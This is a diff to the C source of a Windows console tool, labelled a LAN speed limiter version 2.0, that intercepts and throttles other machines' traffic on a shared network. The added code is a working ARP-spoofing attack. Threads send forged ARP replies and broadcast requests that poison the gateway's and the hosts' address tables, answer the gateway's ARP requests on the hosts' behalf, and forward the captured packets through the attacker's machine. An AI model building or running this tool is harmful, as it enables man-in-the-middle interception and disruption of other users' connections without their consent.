@@ -16,7 +16,7 @@ const char *about_str=\
                       "\n"
                       "\t-------------------------------------------------------------\n"
                       "\t+                                                           +\n"
-                      "\t+                   局域网限速（Ver 1.0）                   +\n"
+                      "\t+                   局域网限速（Ver 2.0）                   +\n"
                       "\t+                                                           +\n"
                       "\t+                                                           +\n"
                       "\t+          赠给大学志同道合的基友 坤坤 AND 小张             +\n"
@@ -56,6 +56,7 @@ typedef struct _Host_Info_
     char ip[16];
     unsigned char mac[6];
     int timestamp;
+    int alive;
     struct _Host_Info_ *next;
 } HOST_INFO;
 
@@ -63,6 +64,7 @@ SYS_CON gl_Sys_Con;
 HOST_INFO *glp_Host_List_Header=NULL;
 HOST_INFO *glp_custom_List_Header=NULL;
 CRITICAL_SECTION cs_flowSpeed;
+CRITICAL_SECTION cs_arpCount;
 unsigned long int arpPacketCount=0;
 unsigned long int flowPacketCount=0;
 unsigned long int subHostCount=0;
@@ -350,13 +352,36 @@ int bind_arp_list()
 
 DWORD WINAPI respond_arp_thread(LPVOID para)
 {
+    int i=1;
+    char ARPPacket[60];
+    char *pIp=(char *)para;
+
+    while(i<1000)
+    {
+        if(!memory_empty(gl_Sys_Con.gatewayMAC,sizeof(gl_Sys_Con.gatewayMAC)))
+        {
+            memset(ARPPacket,NULL,sizeof(ARPPacket));
+            Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),gl_Sys_Con.gatewayMAC,gl_Sys_Con.gatewayIp,\
+                           gl_Sys_Con.myMAC,pIp,2);
+            SendPacket(gl_Sys_Con.hpcap,ARPPacket,sizeof(ARPPacket));
+            EnterCriticalSection(&cs_arpCount);
+            arpPacketCount++;
+            LeaveCriticalSection(&cs_arpCount);
+        }
+        Sleep(i);
+        i+=100;
+    }
+    free(para);
+
     return 0;
 }
 
 int deal_packet(u_char *param,const struct pcap_pkthdr *pkthdr,const u_char *pkt_data)
 {
+    int i;
     char *Packet=NULL;
     char tmpIp[16];
+    char *pIp=NULL;
     DLCHEADER *DLCHeader=NULL;
     IP *IPHeader=NULL;
     ARPFRAME *ARPHeader=NULL;
@@ -366,7 +391,19 @@ int deal_packet(u_char *param,const struct pcap_pkthdr *pkthdr,const u_char *pkt
 
     if(pkthdr->caplen<sizeof(DLCHEADER)) return -1;
     DLCHeader=(DLCHEADER *)Packet;
-    if(strncmp(DLCHeader->DesMAC,gl_Sys_Con.myMAC,6)) return 0;
+
+    //不是本机MAC
+    if(strncmp(DLCHeader->DesMAC,gl_Sys_Con.myMAC,6))
+    {
+        //检测是否是广播地址
+        for(i=0; i<6; i++)
+        {
+            if(DLCHeader->DesMAC[i]!=0xff)
+            {
+                return 0;
+            }
+        }
+    }
 
     //printf("%d %d\n",pkthdr->caplen,pkthdr->len);
 
@@ -375,11 +412,12 @@ int deal_packet(u_char *param,const struct pcap_pkthdr *pkthdr,const u_char *pkt
         //接收到ARP协议包
         if(pkthdr->caplen<sizeof(DLCHEADER)+sizeof(ARPFRAME)) return -1;
         ARPHeader=(ARPFRAME *)(Packet+sizeof(DLCHEADER));
+
         if(ARPHeader->Opcode==htons(2))
         {
             //接收到应答包
             memset(tmpIp,NULL,sizeof(tmpIp));
-            strcat(tmpIp,inet_ntoa(*(struct in_addr *)ARPHeader->Send_Prot_Addr));
+            strcat(tmpIp,inet_ntoa(*(struct in_addr *)ARPHeader->Send_Prot_Addr));  //解析源IP
             if(!strcmp(tmpIp,gl_Sys_Con.gatewayIp))
             {
                 //接收到网关MAC地址
@@ -390,11 +428,13 @@ int deal_packet(u_char *param,const struct pcap_pkthdr *pkthdr,const u_char *pkt
                 }
                 return 0;
             }
+
             for(pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
             {
                 if(!strcmp(tmpIp,pNode->ip))
                 {
                     //更新链表中的ARP对应表
+                    pNode->alive=1;
                     memcpy(pNode->mac,ARPHeader->Send_HW_Addr,6);
                     pNode->timestamp=time(NULL);
                     return 0;
@@ -404,6 +444,53 @@ int deal_packet(u_char *param,const struct pcap_pkthdr *pkthdr,const u_char *pkt
         else
         {
             //接收到ARP请求包
+            if(!strncmp(gl_Sys_Con.gatewayMAC,ARPHeader->Send_HW_Addr,6))
+            {
+                //是来自网关的请求
+                pIp=(char *)malloc(16);
+                if(pIp==NULL) return -1;
+                memset(pIp,NULL,16);
+                //被请求的IP
+                strcat(pIp,inet_ntoa(*(struct in_addr *)ARPHeader->Targ_Prot_Addr));
+
+                for(pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
+                {
+                    if(!strcmp(pIp,pNode->ip))
+                    {
+                        pNode->timestamp=time(NULL);
+                        pNode->alive=1;
+                        break;
+                    }
+                }
+                if(pNode!=NULL || gl_Sys_Con.respondMode==2)
+                {
+                    //被动应答模式
+                    CloseHandle(CreateThread(NULL,0,respond_arp_thread,(LPVOID)pIp,0,NULL));
+                    //puts(pIp);
+                }
+                else
+                {
+                    //主动应答交给其它线程
+                    free(pIp);
+                }
+            }
+            else
+            {
+                //来自其它主机的请求
+                memset(tmpIp,NULL,sizeof(tmpIp));
+                strcat(tmpIp,inet_ntoa(*(struct in_addr *)ARPHeader->Send_Prot_Addr));  //解析源IP
+
+                for(pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
+                {
+                    if(!strcmp(tmpIp,pNode->ip))
+                    {
+                        pNode->timestamp=time(NULL);
+                        pNode->alive=1;
+                        memcpy(pNode->mac,ARPHeader->Send_HW_Addr,6);
+                        break;
+                    }
+                }
+            }
         }
     }
     else if(ntohs(DLCHeader->EtherType)==0x0800)
@@ -420,7 +507,7 @@ int deal_packet(u_char *param,const struct pcap_pkthdr *pkthdr,const u_char *pkt
             {
                 for(pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
                 {
-                    if(!strcmp(tmpIp,pNode->ip))
+                    if(!strcmp(tmpIp,pNode->ip) && !memory_empty(pNode->mac,6))
                     {
                         //找到转发对应表
                         memcpy(DLCHeader->SrcMAC,gl_Sys_Con.myMAC,6);
@@ -504,7 +591,7 @@ int about()
 {
     char choose;
 
-    system("color D");
+    system("color a");
     printf("%s\n",about_str);
     printf("\n1.开始限速    2.编辑配置文件    3.生成配置文件\n");
 reselect:
@@ -538,6 +625,7 @@ reselect:
     default:
         goto reselect;
     }
+
     return 0;
 }
 
@@ -551,11 +639,15 @@ int init_config()
 
     memset(&gl_Sys_Con,NULL,sizeof(gl_Sys_Con));
 
+    if(access("config.ini",0)!=0)
+    {
+        printf("配置文件不存在，请先生成！\n");
+        getch();
+        exit(-1);
+    }
     file=fopen("config.ini","r");
     if(file==NULL)
     {
-        printf("打开'config.ini'文件出错！\n");
-        getch();
         return -1;
     }
     while(!feof(file))
@@ -689,6 +781,7 @@ int init_host_list()
                 {
                     continue;
                 }
+                subHostCount++;
 
                 //检测是不是网关或本机IP
                 if(!strcmp(ip,gl_Sys_Con.gatewayIp) || !strcmp(ip,gl_Sys_Con.myIPAddress))
@@ -712,7 +805,6 @@ int init_host_list()
                 if(writeList) continue;
 
                 //加入到探测列表中
-                subHostCount++;
                 if(glp_Host_List_Header==NULL)
                 {
                     glp_Host_List_Header=(HOST_INFO *)malloc(sizeof(HOST_INFO));
@@ -743,34 +835,45 @@ int init_host_list()
 
 DWORD WINAPI scan_host_mac_thread(LPVOID para)
 {
-    char ARPPacket[42];
+    char ARPPacket[60];
     HOST_INFO *pNode=NULL;
 
     while(1)
     {
-        //询问网关MAC
-        memset(ARPPacket,NULL,sizeof(ARPPacket));
-        Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),NULL,gl_Sys_Con.gatewayIp,gl_Sys_Con.myMAC,gl_Sys_Con.myIPAddress,1);
-        SendPacket(gl_Sys_Con.hpcap,ARPPacket,sizeof(ARPPacket));
+        if(memory_empty(gl_Sys_Con.gatewayMAC,6))
+        {
+            //询问网关MAC
+            memset(ARPPacket,NULL,sizeof(ARPPacket));
+            Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),NULL,gl_Sys_Con.gatewayIp,gl_Sys_Con.myMAC,gl_Sys_Con.myIPAddress,1);
+            SendPacket(gl_Sys_Con.hpcap,ARPPacket,sizeof(ARPPacket));
+        }
 
         //扫描目标主机MAC
         for(pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
         {
-            if(!memory_empty(pNode->mac,6) && time(NULL)-pNode->timestamp>30)
+            if(pNode->alive)
             {
-                //条目超过30秒失效
-                memset(pNode->mac,NULL,6);
-                if(memory_empty(pNode->mac,6))
+                if(!memory_empty(pNode->mac,6) && time(NULL)-pNode->timestamp>60)
                 {
-                    //printf("已清空%s\n",pNode->ip);
+                    //有应答主机条目超过60秒失效
+                    memset(pNode->mac,NULL,6);
+                    pNode->alive=0;
+                }
+                else if(memory_empty(pNode->mac,6) && time(NULL)-pNode->timestamp>60*10)
+                {
+                    //无应答主机条目10分钟失效
+                    memset(pNode->mac,NULL,6);
+                    pNode->alive=0;
                 }
             }
+
             memset(ARPPacket,NULL,sizeof(ARPPacket));
             Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),NULL,pNode->ip,gl_Sys_Con.myMAC,gl_Sys_Con.myIPAddress,1);
             SendPacket(gl_Sys_Con.hpcap,ARPPacket,sizeof(ARPPacket));
             Sleep(2);
         }
         macScanCount++;
+
         Sleep(5000);
     }
 
@@ -803,24 +906,54 @@ int memory_empty(char *str,int size)
 
 DWORD WINAPI arp_spoof_thread(LPVOID para)
 {
+    int i;
     HOST_INFO *pNode=NULL;
-    char ARPPacket[42];
+    char ARPPacket[60];
+    int timestamp=0;
+
+    while(memory_empty(gl_Sys_Con.gatewayMAC,sizeof(gl_Sys_Con.gatewayMAC))) Sleep(100);
 
     while(1)
     {
-        if(!memory_empty(gl_Sys_Con.gatewayMAC,sizeof(gl_Sys_Con.gatewayMAC)))
+        if(time(NULL)-timestamp>60*10)
         {
-            for(pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
+            //扰乱局域网路由表
+            timestamp=time(NULL);
+            for(i=0; i<3; i++)
             {
-                if(!memory_empty(pNode->mac,sizeof(pNode->mac)))
+                for(pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
                 {
+                    //发送给网关
                     memset(ARPPacket,NULL,sizeof(ARPPacket));
                     Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),gl_Sys_Con.gatewayMAC,gl_Sys_Con.gatewayIp,\
                                    gl_Sys_Con.myMAC,pNode->ip,2);
                     SendPacket(gl_Sys_Con.hpcap,ARPPacket,sizeof(ARPPacket));
                     arpPacketCount++;
                     Sleep(2);
+
+                    //以广播请求方式发送给主机
+                    memset(ARPPacket,NULL,sizeof(ARPPacket));
+                    Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),NULL,pNode->ip,\
+                                   gl_Sys_Con.myMAC,gl_Sys_Con.gatewayIp,1);
+                    SendPacket(gl_Sys_Con.hpcap,ARPPacket,sizeof(ARPPacket));
+                    arpPacketCount++;
+                    Sleep(2);
                 }
+            }
+
+        }
+
+        for(pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
+        {
+            if(gl_Sys_Con.sceneMode==2 || pNode->alive)
+            {
+                //存活即欺骗
+                memset(ARPPacket,NULL,sizeof(ARPPacket));
+                Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),gl_Sys_Con.gatewayMAC,gl_Sys_Con.gatewayIp,\
+                               gl_Sys_Con.myMAC,pNode->ip,2);
+                SendPacket(gl_Sys_Con.hpcap,ARPPacket,sizeof(ARPPacket));
+                arpPacketCount++;
+                Sleep(2);
             }
         }
         Sleep(gl_Sys_Con.interval);
@@ -831,26 +964,49 @@ DWORD WINAPI arp_spoof_thread(LPVOID para)
 
 DWORD WINAPI print_log_thread(LPVOID para)
 {
-    int i,n;
+    int aliveCount,n,notResHost;
     HOST_INFO *pNode=NULL;
 
     while(1)
     {
-        for(i=n=0,pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
+        for(aliveCount=notResHost=n=0,pNode=glp_Host_List_Header; pNode!=NULL; pNode=pNode->next)
         {
-            if(!memory_empty(pNode->mac,6))
+            if(pNode->alive)
             {
-                i++;
+                aliveCount++;
+                if(memory_empty(pNode->mac,6))
+                {
+                    notResHost++;
+                }
             }
-            //n++;
+            n++;
+            if(gl_Sys_Con.respondMode==2 && pNode->alive)
+            {
+
+            }
         }
         if(print_lock) return 0;
         system("cls");
         printf("%s\n",about_str);
-        printf("本机IP：%s\n",gl_Sys_Con.myIPAddress);
-        printf("网关IP：%s\n\n",gl_Sys_Con.gatewayIp);
-        printf("子网主机：\t%d\t个\n限速主机:\t%d\t个\n探测计数：\t%d\t次\n发送ARP包:\t%d\t个\n转发流量包:\t%d\t个\n转发流量速率:\t%.2f\tKb/s\n总转发流量:\t%.2f\tMb\n",\
-               subHostCount,i,macScanCount,arpPacketCount,flowPacketCount,recordFlowSpeed/1024,totalFlowSize/1024/1024);
+        if(gl_Sys_Con.sceneMode==2 && gl_Sys_Con.respondMode==1)
+        {
+            notResHost=aliveCount-notResHost;
+            notResHost=n-notResHost;
+            aliveCount=n;
+        }
+        printf("\t       本机IP：%s",gl_Sys_Con.myIPAddress);
+        printf("\t网关IP：%s\n",gl_Sys_Con.gatewayIp);
+        printf("\t-------------------------------------------------------------\n");
+        printf("\t|\t子网主机：\t%d\t\t个\t\t    |\n",subHostCount);
+        printf("\t|\t限速主机:\t%d\t\t个\t\t    |\n",aliveCount);
+        printf("\t|\t无应答主机：\t%d\t\t个\t\t    |\n",notResHost);
+        printf("\t|\t探测计数：\t%d\t\t次\t\t    |\n",macScanCount);
+        printf("\t|\t发送ARP包:\t%d\t\t个\t\t    |\n",arpPacketCount);
+        printf("\t|\t转发流量包:\t%d\t\t个\t\t    |\n",flowPacketCount);
+        printf("\t|\t转发流量速率:\t%.2f\t\tKb/s\t\t    |\n",recordFlowSpeed/1024);
+        printf("\t|\t总转发流量:\t%.2f\t\tMb\t\t    |\n",totalFlowSize/1024/1024);
+        printf("\t-------------------------------------------------------------\n");
+
         Sleep(1000);
     }
 
@@ -865,15 +1021,16 @@ int main(int argc,char *argv[])
     pcap_t *hpcap=NULL;
 
     InitializeCriticalSection(&cs_flowSpeed);
+    InitializeCriticalSection(&cs_arpCount);
 
-    SMALL_RECT winPon= {0,0,80,20};
+    SMALL_RECT winPon= {0,0,80,30};
     HANDLE con=GetStdHandle(STD_OUTPUT_HANDLE);
     SetConsoleWindowInfo(con,TRUE,&winPon);
 
     about();
     if(init_config()!=0)
     {
-        printf("请检查配置文件是否正确！\n");
+        printf("配置文件参数错误！请重新生成。\n");
         getch();
         exit(-1);
     }
@@ -912,17 +1069,17 @@ int main(int argc,char *argv[])
         return -1;
     }
 
-    if(gl_Sys_Con.sceneMode==1)
-    {
-        //开启扫描MAC线程
-        CloseHandle(CreateThread(NULL,0,scan_host_mac_thread,NULL,0,NULL));
+    //开启扫描MAC线程
+    CloseHandle(CreateThread(NULL,0,scan_host_mac_thread,NULL,0,NULL));
 
+    if(gl_Sys_Con.respondMode==1)
+    {
         //开启ARP欺骗线程
         CloseHandle(CreateThread(NULL,0,arp_spoof_thread,NULL,0,NULL));
-
-        //开启流量清零线程
-        CloseHandle(CreateThread(NULL,0,flow_clear_thread,NULL,0,NULL));
     }
+
+    //开启流量清零线程
+    CloseHandle(CreateThread(NULL,0,flow_clear_thread,NULL,0,NULL));
 
     //开启日志线程
     CloseHandle(CreateThread(NULL,0,print_log_thread,NULL,0,NULL));
